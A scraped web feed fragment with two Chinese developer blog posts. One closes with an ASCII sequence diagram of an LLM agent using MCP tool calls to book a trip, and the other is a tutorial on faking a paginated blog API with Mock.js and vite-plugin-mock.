<p>有了<code>Agent</code>、<code>Mcp</code>，本质上完整的一次自然语言对话 -&gt; 反馈的系统流转图就很清晰了。</p>
<p>基于这套框架来扩展即可。</p>
<p>一次完整对话到反馈的时序图大概是这样：</p>
<pre><code class="hljs language-css" lang="css">用户                主Agent              子Agent           MCP服务器         LLM模型          数据库
 │                   │                   │                 │                │                │
 │ 用户请求:         │                   │                 │                │                │
 │ <span class="hljs-string">"帮我订一张      │                   │                 │                │                │
 │  明天北京到      │                   │                 │                │                │
 │  上海的机票      │                   │                 │                │                │
 │  和酒店"</span>        │                   │                 │                │                │
 │──────────────────&gt;│                   │                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">1</span>. 初始化对话      │                 │                │                │
 │                   │    构建系统提示词  │                 │                │                │
 │                   │────────────────────────────────────&gt;│                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">2</span>. 请求可用工具列表│                 │                │                │
 │                   │──────────────────────────────────────────────────────&gt;│                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">3</span>. 返回工具列表    │                 │                │                │
 │                   │&lt;──────────────────────────────────────────────────────│                │
 │                   │    (search_flights, search_hotels,   │                │                │
 │                   │     book_trip, etc.)                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">4</span>. 获取提示词模板  │                 │                │                │
 │                   │──────────────────────────────────────&gt;│                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">5</span>. 返回提示词      │                 │                │                │
 │                   │&lt;──────────────────────────────────────│                │                │
 │                   │   (booking_recommendation等)         │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">6</span>. 构建系统消息    │                 │                │                │
 │                   │    (系统提示词+工具定义+提示词)      │                │                │
 │                   │    users消息=<span class="hljs-string">"用户请求内容"</span>         │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">7</span>. 调用 LLM        │                 │                │                │
 │                   │──────────────────────────────────────────────────────&gt;│                │
 │                   │                   │                 │                │  分析意图       │
 │                   │                   │                 │                │  (BOOK_TRIP)    │
 │                   │                   │                 │                │  提取参数       │
 │                   │                   │                 │                │  (from, to,date)│
 │                   │                   │                 │                │  生成工具调用   │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">8</span>. LLM 响应        │                 │                │                │
 │                   │&lt;──────────────────────────────────────────────────────│                │
 │                   │    {                                 │                │                │
 │                   │      "type": <span class="hljs-string">"tool_call"</span>,            │                │                │
 │                   │      <span class="hljs-string">"tool_name"</span>: <span class="hljs-string">"search_flights"</span>,  │                │                │
 │                   │      <span class="hljs-string">"arguments"</span>: {                  │                │                │
 │                   │        "<span class="hljs-selector-tag">from</span>": <span class="hljs-string">"北京"</span>,                │                │                │
 │                   │        <span class="hljs-string">"to"</span>: <span class="hljs-string">"上海"</span>,                  │                │                │
 │                   │        <span class="hljs-string">"date"</span>: <span class="hljs-string">"明天"</span>                 │                │                │
 │                   │      }                               │                │                │
 │                   │    }                                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">9</span>. 检测到工具调用, │                 │                │                │
 │                   │    路由到子Agent   │                 │                │                │
 │                   │────────────────────&gt;│                │                │                │
 │                   │                   │                 │                │                │
 │                   │                   │ <span class="hljs-number">10</span>. 子Agent     │                │                │
 │                   │                   │     处理工具调用 │                │                │
 │                   │                   │──────────────────&gt;│                │                │
 │                   │                   │                 │                │                │
 │                   │                   │ <span class="hljs-number">11</span>. Travel MCP  │                │                │
 │                   │                   │     执行         │                │                │
 │                   │                   │     search_flights│               │                │
 │                   │                   │                 │ 查询数据库     │                │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │                   │                 │ 返回机票列表   │                │
 │                   │                   │                 │&lt;────────────────────────────────│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">12</span>. 返回工具结果   │                 │                │                │
 │                   │&lt;────────────────────                 │                │                │
 │                   │    <span class="hljs-selector-attr">[                                │                │                │ │                   │      {                               │                │                │ │                   │        <span class="hljs-string">"id"</span>: <span class="hljs-string">"CA123"</span>,                │                │                │ │                   │        <span class="hljs-string">"airline"</span>: <span class="hljs-string">"国航"</span>,             │                │                │ │                   │        <span class="hljs-string">"departure"</span>: <span class="hljs-string">"10:00"</span>,         │                │                │ │                   │        <span class="hljs-string">"price"</span>: 1200                 │                │                │ │                   │      },                              │                │                │ │                   │      ...                             │                │                │ │                   │    ]</span>                                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">13</span>. 添加工具结果   │                 │                │                │
 │                   │     到对话历史     │                 │                │                │
 │                   │     再次调用 LLM   │                 │                │                │
 │                   │──────────────────────────────────────────────────────&gt;│                │
 │                   │                   │                 │                │  分析机票      │
 │                   │                   │                 │                │  生成下一个工具│
 │                   │                   │                 │                │  调用:         │
 │                   │                   │                 │                │  search_hotels │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">14</span>. LLM 响应(第<span class="hljs-number">2</span>次)│                 │                │                │
 │                   │&lt;──────────────────────────────────────────────────────│                │
 │                   │    {                                 │                │                │
 │                   │      "type": <span class="hljs-string">"tool_call"</span>,            │                │                │
 │                   │      <span class="hljs-string">"tool_name"</span>: <span class="hljs-string">"search_hotels"</span>,   │                │                │
 │                   │      <span class="hljs-string">"arguments"</span>: {                  │                │                │
 │                   │        "city": <span class="hljs-string">"上海"</span>,                │                │                │
 │                   │        <span class="hljs-string">"check_in"</span>: <span class="hljs-string">"明天"</span>,            │                │                │
 │                   │        <span class="hljs-string">"check_out"</span>: <span class="hljs-string">"后天"</span>            │                │                │
 │                   │      }                               │                │                │
 │                   │    }                                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">15</span>. 再次路由到子Agent│                │                │                │
 │                   │────────────────────&gt;│                │                │                │
 │                   │                   │                 │                │                │
 │                   │                   │ <span class="hljs-number">16</span>. 执行        │                │                │
 │                   │                   │     search_hotels│               │                │
 │                   │                   │──────────────────&gt;│                │                │
 │                   │                   │                 │                │ 查询酒店       │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │                   │                 │ 返回酒店列表   │                │
 │                   │                   │                 │&lt;────────────────────────────────│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">17</span>. 返回酒店结果   │                 │                │                │
 │                   │&lt;────────────────────                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">18</span>. 再次调用 LLM   │                 │                │                │
 │                   │     (决定下一步)   │                 │                │                │
 │                   │──────────────────────────────────────────────────────&gt;│                │
 │                   │                   │                 │                │  分析酒店      │
 │                   │                   │                 │                │  推荐最佳套餐  │
 │                   │                   │                 │                │  生成工具调用: │
 │                   │                   │                 │                │  book_trip     │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">19</span>. LLM 响应(第<span class="hljs-number">3</span>次)│                 │                │                │
 │                   │&lt;──────────────────────────────────────────────────────│                │
 │                   │    {                                 │                │                │
 │                   │      "type": <span class="hljs-string">"tool_call"</span>,            │                │                │
 │                   │      <span class="hljs-string">"tool_name"</span>: <span class="hljs-string">"book_trip"</span>,       │                │                │
 │                   │      <span class="hljs-string">"arguments"</span>: {                  │                │                │
 │                   │        "flight_id": <span class="hljs-string">"CA123"</span>,         │                │                │
 │                   │        <span class="hljs-string">"hotel_id"</span>: <span class="hljs-string">"SH001"</span>           │                │                │
 │                   │      }                               │                │                │
 │                   │    }                                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">20</span>. 路由到子Agent  │                 │                │                │
 │                   │ (预订差旅)         │                 │                │                │
 │                   │────────────────────&gt;│                │                │                │
 │                   │                   │                 │                │                │
 │                   │                   │ <span class="hljs-number">21</span>. 执行book_trip│               │                │
 │                   │                   │──────────────────&gt;│                │                │
 │                   │                   │                 │                │ 创建订单       │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │                   │                 │ 返回订单号     │                │
 │                   │                   │                 │&lt;────────────────────────────────│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">22</span>. 返回预订结果   │                 │                │                │
 │                   │&lt;────────────────────                 │                │                │
 │                   │    {                                 │                │                │
 │                   │      "trip_id": <span class="hljs-string">"TRIP_001"</span>,          │                │                │
 │                   │      <span class="hljs-string">"status"</span>: <span class="hljs-string">"confirmed"</span>,          │                │                │
 │                   │      <span class="hljs-string">"total_cost"</span>: <span class="hljs-number">3000</span>              │                │                │
 │                   │    }                                 │                │                │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">23</span>. 调用Calendar MCP│                │                │                │
 │                   │     添加日程        │                │                │                │
 │                   │────────────────────────────────────────────────────────&gt;│               │
 │                   │                   │                 │                │ 添加日历事件   │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │                   │                 │ 返回事件ID     │                │
 │                   │                   │                 │&lt;────────────────────────────────│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">24</span>. 调用Payment MCP│                 │                │                │
 │                   │     处理支付        │                 │                │                │
 │                   │────────────────────────────────────────────────────────&gt;│               │
 │                   │                   │                 │                │ 创建支付单     │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │                   │                 │ 返回交易ID     │                │
 │                   │                   │                 │&lt;────────────────────────────────│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">25</span>. 调用Alert MCP  │                 │                │                │
 │                   │     发送通知        │                 │                │                │
 │                   │────────────────────────────────────────────────────────&gt;│               │
 │                   │                   │                 │                │ 记录通知        │
 │                   │                   │                 │────────────────────────────────&gt;│
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">26</span>. 最后调用 LLM   │                 │                │                │
 │                   │     生成友好回复   │                 │                │                │
 │                   │──────────────────────────────────────────────────────&gt;│                │
 │                   │                   │                 │                │ 总结整个过程    │
 │                   │                   │                 │                │ 生成用户友好    │
 │                   │                   │                 │                │ 的文字回复      │
 │                   │                   │                 │                │                │
 │                   │ <span class="hljs-number">27</span>. LLM 最终响应   │                 │                │                │
 │                   │&lt;──────────────────────────────────────────────────────│                │
 │                   │    "好的，已为您预订了从北京       │                │                │
 │                   │     到上海的差旅。您的订单号是    │                │                │
 │                   │     TRIP_001，总费用<span class="hljs-number">3000</span>元。     │                │                │
 │                   │     已添加到您的日程，并发送

</code></pre>
<p>本质上一句话总结：对话发起后，主Agent构建基础提示词进行首轮行为分析后，然后按需注入子Agent来递归/循环完成一轮对话。</p>
<h2 data-id="heading-5">结尾</h2>
<p>如上就非常简单直观的结合代码，讲解了现在LLM大模型应用的核心架构和角色拆解。</p>
<p>希望对大家有所帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前后端分离开发实战：从等后端到自己造数据]]></title>    <link>https://juejin.cn/post/7597641580104056886</link>    <guid>https://juejin.cn/post/7597641580104056886</guid>    <pubDate>2026-01-21T09:03:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597641580104056886" data-draft-id="7597596202024763434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前后端分离开发实战：从等后端到自己造数据"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-21T09:03:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无敌的拖拉斯旋风"/> <meta itemprop="url" content="https://juejin.cn/user/951508170179208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前后端分离开发实战：从等后端到自己造数据
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/951508170179208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无敌的拖拉斯旋风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:03:22.000Z" title="Wed Jan 21 2026 09:03:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">遇到的真实问题</h2>
<p>刚入行那会儿，我经常遇到这种尴尬情况：写好了页面布局，准备连接后端接口，结果后端同事说："接口还没写完，你先等等。"</p>
<p>等啊等，一等就是一周，有时候甚至两周。我只能在那干坐着，或者写一些无关紧要的代码，感觉特别被动。</p>
<p>后来老鸟告诉我："兄弟，你不用等后端的，自己先造点假数据跑起来，等后端接口出来后再换掉就行了。"</p>
<p>我当时还不信，直到看到Mock.js这个工具，才发现原来前端开发可以这么爽！</p>
<h2 data-id="heading-1">什么是前后端分离？</h2>
<p>简单说，就是前端只管页面和交互，后端只管数据和业务逻辑。就像两个人合作做菜，一个人负责摆盘（前端），一个人负责炒菜（后端），最后合成一道完整的菜。</p>
<p>但是，如果摆盘的师傅等炒菜的师傅先做好菜，那整个流程就很慢。所以聪明的做法是，摆盘师傅先拿一些假菜练习摆盘，等真菜来了再换上去。</p>
<h2 data-id="heading-2">Mock.js：前端的"造物主"</h2>
<p>Mock.js就像是前端开发者的"造物主"，可以凭空变出各种数据来。比如我要100篇文章，它就能瞬间给我100篇；我要用户信息，它也能马上生成。</p>
<h3 data-id="heading-3">安装和使用</h3>
<p>bash</p>
<pre><code class="hljs">npm install mockjs
</code></pre>
<p>然后就可以开始"造数据"了：</p>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Mock</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'mockjs'</span>

<span class="hljs-comment">// 比如我要造10篇文章的数据</span>
<span class="hljs-keyword">const</span> articles = <span class="hljs-title class_">Mock</span>.<span class="hljs-title function_">mock</span>({
    <span class="hljs-string">'list|10'</span>: [{  <span class="hljs-comment">// 生成10条数据</span>
        <span class="hljs-string">'id|+1'</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// ID从1开始递增</span>
        <span class="hljs-string">'title'</span>: <span class="hljs-string">'@ctitle(10, 30)'</span>,  <span class="hljs-comment">// 随机中文标题，10-30个字符</span>
        <span class="hljs-string">'content'</span>: <span class="hljs-string">'@cparagraph(3, 10)'</span>,  <span class="hljs-comment">// 随机中文段落，3-10句话</span>
        <span class="hljs-string">'author'</span>: <span class="hljs-string">'@cname'</span>,  <span class="hljs-comment">// 随机中文姓名</span>
        <span class="hljs-string">'date'</span>: <span class="hljs-string">'@date("yyyy-MM-dd")'</span>  <span class="hljs-comment">// 随机日期</span>
    }]
})

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(articles.<span class="hljs-property">list</span>)  <span class="hljs-comment">// 就能看到10条随机文章数据</span>
</code></pre>
<p>是不是很神奇？几行代码就能生成看起来很真实的测试数据。</p>
<h2 data-id="heading-4">实战：博客文章列表功能</h2>
<p>我们来做一个具体的例子：博客文章列表页面。这个页面需要显示文章列表，还要有分页功能。</p>
<h3 data-id="heading-5">先看接口长什么样</h3>
<p>一般后端会给我们这样的接口文档：</p>
<p>text</p>
<pre><code class="hljs language-json" lang="json">GET /api/posts?page=<span class="hljs-number">1</span>&amp;limit=<span class="hljs-number">10</span>

返回数据格式：
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"items"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>...<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 文章列表</span>
    <span class="hljs-attr">"pagination"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"current"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 当前页</span>
      <span class="hljs-attr">"limit"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 每页数量</span>
      <span class="hljs-attr">"total"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 总数</span>
      <span class="hljs-attr">"totalPage"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span>  <span class="hljs-comment">// 总页数</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-6">用Mock.js造数据</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Mock</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'mockjs'</span>

<span class="hljs-comment">// 定义文章标签</span>
<span class="hljs-keyword">const</span> tags = [<span class="hljs-string">"前端"</span>, <span class="hljs-string">"后端"</span>, <span class="hljs-string">"AI"</span>, <span class="hljs-string">"职场"</span>, <span class="hljs-string">"面试"</span>, <span class="hljs-string">"算法"</span>]

<span class="hljs-comment">// 造45篇文章数据</span>
<span class="hljs-keyword">const</span> posts = <span class="hljs-title class_">Mock</span>.<span class="hljs-title function_">mock</span>({
    <span class="hljs-string">'list|45'</span>: [{
        <span class="hljs-string">'id|+1'</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// ID自增</span>
        <span class="hljs-string">'title'</span>: <span class="hljs-string">'@ctitle(8, 20)'</span>,  <span class="hljs-comment">// 中文标题</span>
        <span class="hljs-string">'brief'</span>: <span class="hljs-string">'@cparagraph(1, 3)'</span>,  <span class="hljs-comment">// 文章简介</span>
        <span class="hljs-string">'totalComments|0-50'</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 评论数0-50</span>
        <span class="hljs-string">'totalLikes|0-1000'</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 点赞数0-1000</span>
        <span class="hljs-string">'publishedAt'</span>: <span class="hljs-string">'@datetime("yyyy-MM-dd HH:mm")'</span>,  <span class="hljs-comment">// 发布时间</span>
        <span class="hljs-string">'user'</span>: {  <span class="hljs-comment">// 用户信息</span>
            <span class="hljs-string">'id|1-10'</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 用户ID 1-10</span>
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'@cname'</span>,  <span class="hljs-comment">// 用户姓名</span>
            <span class="hljs-string">'avatar'</span>: <span class="hljs-string">'@image("100x100", "#ccc", "#fff", "avatar")'</span>  <span class="hljs-comment">// 头像</span>
        },
        <span class="hljs-string">'tags'</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {  <span class="hljs-comment">// 标签，随机选2个</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mock</span>.<span class="hljs-property">Random</span>.<span class="hljs-title function_">pick</span>(tags, <span class="hljs-number">2</span>)
        },
        <span class="hljs-string">'thumbnail'</span>: <span class="hljs-string">'@image("300x200", "#eee", "#999", "thumb")'</span>  <span class="hljs-comment">// 缩略图</span>
    }]
}).<span class="hljs-property">list</span>

<span class="hljs-comment">// 定义Mock接口</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
    {
        <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/posts'</span>,
        <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>,
        <span class="hljs-attr">response</span>: <span class="hljs-function">(<span class="hljs-params">{ query }</span>) =&gt;</span> {
            <span class="hljs-comment">// 获取分页参数</span>
            <span class="hljs-keyword">const</span> { page = <span class="hljs-string">'1'</span>, limit = <span class="hljs-string">'10'</span> } = query
            <span class="hljs-keyword">const</span> currentPage = <span class="hljs-built_in">parseInt</span>(page)
            <span class="hljs-keyword">const</span> size = <span class="hljs-built_in">parseInt</span>(limit)

            <span class="hljs-comment">// 参数校验</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(currentPage) || <span class="hljs-built_in">isNaN</span>(size) || currentPage &lt; <span class="hljs-number">1</span> || size &lt; <span class="hljs-number">1</span>) {
                <span class="hljs-keyword">return</span> {
                    <span class="hljs-attr">code</span>: <span class="hljs-number">400</span>,
                    <span class="hljs-attr">msg</span>: <span class="hljs-string">'页码或每页数量参数错误'</span>,
                    <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>
                }
            }

            <span class="hljs-comment">// 计算分页数据</span>
            <span class="hljs-keyword">const</span> total = posts.<span class="hljs-property">length</span>
            <span class="hljs-keyword">const</span> start = (currentPage - <span class="hljs-number">1</span>) * size
            <span class="hljs-keyword">const</span> end = start + size
            <span class="hljs-keyword">const</span> paginatedData = posts.<span class="hljs-title function_">slice</span>(start, end)

            <span class="hljs-keyword">return</span> {
                <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
                <span class="hljs-attr">msg</span>: <span class="hljs-string">'success'</span>,
                <span class="hljs-attr">data</span>: {
                    <span class="hljs-attr">items</span>: paginatedData,
                    <span class="hljs-attr">pagination</span>: {
                        <span class="hljs-attr">current</span>: currentPage,
                        <span class="hljs-attr">limit</span>: size,
                        <span class="hljs-attr">total</span>: total,
                        <span class="hljs-attr">totalPage</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(total / size)
                    }
                }
            }
        }
    }
]
</code></pre>
<h3 data-id="heading-7">代码解释</h3>
<p>让我解释一下这段代码的关键部分：</p>
<ol>
<li><strong><code>@ctitle(8, 20)</code></strong> ：生成8-20个字符的中文标题</li>
<li><strong><code>@datetime("yyyy-MM-dd HH:mm")</code></strong> ：生成格式化的日期时间</li>
<li><strong><code>Mock.Random.pick(tags, 2)</code></strong> ：从tags数组中随机选择2个标签</li>
<li><strong><code>'id|+1': 1</code></strong>：ID从1开始递增</li>
<li><strong>分页逻辑</strong>：<code>(currentPage - 1) * size</code>计算起始位置</li>
</ol>
<h3 data-id="heading-8">如何在Vite项目中使用</h3>
<p>在你的<code>vite.config.js</code>中加入：</p>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { viteMockServe } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-mock'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">viteMockServe</span>({
      <span class="hljs-attr">mockPath</span>: <span class="hljs-string">'mock'</span>,  <span class="hljs-comment">// mock文件夹位置</span>
      <span class="hljs-attr">enable</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 开启mock</span>
    })
  ]
})
</code></pre>
<p>这样启动项目后，访问<code>/api/posts?page=1&amp;limit=10</code>就能得到Mock数据了。</p>
<h2 data-id="heading-9">为什么这样做很好？</h2>
<h3 data-id="heading-10">1. 不用等后端了</h3>
<p>以前：前端 → 等后端 → 开发<br/>
现在：前端 → Mock数据 → 开发 → 换真实接口</p>
<h3 data-id="heading-11">2. 可以测试边界情况</h3>
<p>用Mock数据，我们可以轻松测试各种边界情况：</p>
<ul>
<li>空数据列表</li>
<li>错误参数</li>
<li>大量数据</li>
<li>网络超时</li>
</ul>
<h3 data-id="heading-12">3. 数据格式可控</h3>
<p>Mock数据完全由前端控制，可以确保数据格式符合前端需求。</p>
<h3 data-id="heading-13">4. 提高开发效率</h3>
